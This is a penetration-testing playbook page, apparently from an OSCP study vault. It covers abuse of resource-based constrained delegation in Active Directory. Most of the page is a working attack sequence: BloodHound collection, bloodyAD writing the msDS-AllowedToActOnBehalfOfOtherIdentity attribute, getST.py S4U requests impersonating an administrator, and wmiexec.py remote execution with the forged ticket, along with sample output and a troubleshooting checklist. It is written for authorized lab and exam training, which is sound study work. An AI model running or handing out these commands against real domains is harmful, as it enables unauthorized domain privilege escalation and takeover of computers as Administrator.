# AD - Resource-Based Constrained Delegation

**Step 45B of 50 · AD**

*Use a computer-object ACL to let a controlled service account impersonate a user to a target computer.*

## When this route applies

RBCD is a Kerberos delegation abuse path. The target computer stores an access-control security descriptor in `msDS-AllowedToActOnBehalfOfOtherIdentity`. If the current account can modify the target computer object, and you control a computer or service account with a usable NT hash, you can add that account to the target's RBCD list.

The usual evidence is:

- `GenericAll`, `GenericWrite`, `WriteDacl`, or an equivalent write right over the target computer.
- A controlled computer account or service account with an SPN.
- A domain controller reachable on Kerberos and LDAP.

## Run this

First collect the relationship data and inspect the target computer ACL:

```bash
bloodhound-python \
  -u $Username \
  -p $Password \
  -d $Domain \
  -ns $BoxIP \
  -c All \
  --zip \
  -op $BoxDir/loot/
```

If the graph shows that the current account controls the target computer, use an existing controlled computer account where possible. The computer account's NT hash can come from a local SAM and SECURITY hive when you have local Administrator access, or from another authorized machine-account extraction path.

```bash
bloodyAD \
  -u $Username \
  -p $Password \
  -d $Domain \
  --host $BoxIP \
  add rbcd \
  $TargetComputer \
  $MachineAccount
```

`$TargetComputer` is the computer receiving the delegation setting. `$MachineAccount` is the account that will perform the S4U requests. Preserve the trailing `$` on computer accounts.

Request a service ticket while impersonating a privileged user:

```bash
getST.py \
  -spn "cifs/$FQDN" \
  -impersonate $AdminUser \
  -dc-ip $BoxIP \
  "$Domain/$MachineAccount" \
  -hashes ":$NThash"
```

The expected sequence is `S4U2self`, followed by `S4U2Proxy`, followed by creation of a `.ccache` file. Use the ccache with an Impacket Kerberos-aware client:

```bash
KRB5CCNAME=$BoxDir/loot/Administrator.ccache \
wmiexec.py -k -no-pass $FQDN
```

## Example output

```text
[*] Adding new computer account
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity updated
[*] Impersonating Administrator
[*] Saving ticket in Administrator.ccache
```

Focus on the sequence, not the wording. The ACL change must succeed before the ticket request, and the ticket file must exist before the Kerberos client is run. If the first step succeeds but getST.py fails, check the domain name, SPN, clock, and machine-account hash separately.

Move next: an updated RBCD attribute routes to getST.py; a created ccache routes to the Kerberos-aware client; a successful client session routes to proof and [[AD - Clean Down]].

## Why it works

The machine account is not being granted Domain Admins. Instead, the target computer is being told that the controlled machine account may request delegated service tickets on behalf of another user. The service principal name in `getST.py` must match the service you plan to access, such as `cifs/$FQDN` for SMB and administrative shares.

## What did you get?

- [ ] No write right over a computer object → **Return to [[AD - BloodHound]] and search for another ACL path.**
- [ ] A controlled computer account exists → **Use it as `$MachineAccount`; do not create a new account unnecessarily.**
- [ ] No controlled account exists → **Check whether the domain permits a controlled computer account to be added, then use the resulting machine secret.**
- [ ] `add rbcd` succeeds → **Request the S4U ticket with `getST.py`.**
- [ ] `getST.py` fails with a name or clock error → **Resolve `$FQDN` locally and complete [[AD - Clock Sync]] before retrying once.**
- [ ] The ccache is created but the client cannot connect → **Check `KRB5CCNAME`, the service SPN, and `/etc/hosts`.**

## RBCD versus unconstrained delegation

Unconstrained delegation stores reusable delegated TGTs on a trusted host after a user authenticates to it. RBCD changes the target computer's policy to trust a selected service account. When both are visible, RBCD is usually the more deterministic route if the target computer's ACL is writable and a machine hash is available.

> [!warning] 💡
> `GenericAll` over the DC object is not the same as being a domain administrator. It is the permission that enables the delegation change. Record the ACL finding before modifying the object.

> [!warning] 💡
> RBCD changes directory state. Remove the delegation entry during clean-down and verify that the service account can no longer impersonate users to the target.

## Gotchas

- `bloodyAD set object` is easy to misuse because the RBCD attribute is a binary security descriptor. Prefer the dedicated `add rbcd` and `remove rbcd` commands.
- Computer accounts include a trailing `$` in both LDAP and Kerberos identities.
- A working ticket request can still fail at the next step if the target FQDN does not resolve locally.
- Requesting a CIFS ticket and using it through SMB-backed Impacket tooling is the simplest proof path. Use the SPN for the actual service you need.

## Seen in

- [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- GenericAll over DC01, COLTY machine hash, RBCD, and S4U2Proxy to domain Administrator

## Related stages

- [[AD - BloodHound]]
- [[AD - Credential Validation]]
- [[AD - Clean Down]]
- [[Windows - Registry Hive Extraction]]

## External Resources

- [iRed.Team: Resource-Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
- [Microsoft: msDS-AllowedToActOnBehalfOfOtherIdentity](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity)
- [Impacket](https://github.com/fortra/impacket)

## Why this matters for OSCP

This route turns a specific computer-object permission into a repeatable Kerberos escalation workflow. The important exam habit is to separate the ACL finding, machine-secret recovery, ticket request, service access, and cleanup verification.
